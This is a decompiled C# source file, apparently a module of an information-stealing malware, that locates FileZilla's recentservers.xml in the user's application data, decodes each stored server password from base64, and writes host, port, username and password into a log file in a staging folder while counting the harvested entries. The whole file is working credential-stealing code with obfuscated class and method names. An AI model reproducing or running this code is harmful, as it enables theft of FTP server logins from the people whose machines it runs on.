using System;
using System.IO;
using System.Text;
using System.Xml;

internal class Class31
{
	private static StringBuilder stringBuilder_0 = new StringBuilder();

	public static readonly string string_0 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "FileZilla\\recentservers.xml");

	public static void smethod_0()
	{
		string string_ = Class38.string_11;
		if (File.Exists(string_0))
		{
			Directory.CreateDirectory(string_ + "\\FileZilla");
			smethod_1(string_0, string_ + "\\FileZilla\\FileZilla.log");
		}
	}

	public static void smethod_1(string string_1, string string_2, string string_3 = "RecentServers", string string_4 = "Server")
	{
		try
		{
			if (!File.Exists(string_1))
			{
				return;
			}
			XmlDocument xmlDocument = new XmlDocument();
			xmlDocument.Load(string_1);
			foreach (XmlElement item in ((XmlElement)xmlDocument.GetElementsByTagName(string_3)[0]).GetElementsByTagName(string_4))
			{
				string innerText = item.GetElementsByTagName("Host")[0]!.InnerText;
				string innerText2 = item.GetElementsByTagName("Port")[0]!.InnerText;
				string innerText3 = item.GetElementsByTagName("User")[0]!.InnerText;
				string @string = Encoding.UTF8.GetString(Convert.FromBase64String(item.GetElementsByTagName("Pass")[0]!.InnerText));
				if (!string.IsNullOrEmpty(innerText) && !string.IsNullOrEmpty(innerText2) && !string.IsNullOrEmpty(innerText3) && !string.IsNullOrEmpty(@string))
				{
					stringBuilder_0.AppendLine("Host: " + innerText);
					stringBuilder_0.AppendLine("Port: " + innerText2);
					stringBuilder_0.AppendLine("User: " + innerText3);
					stringBuilder_0.AppendLine("Pass: " + @string + "\r\n");
					Class36.int_10++;
					continue;
				}
				break;
			}
			if (stringBuilder_0.Length > 0)
			{
				File.AppendAllText(string_2, stringBuilder_0.ToString());
			}
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
		}
	}
}
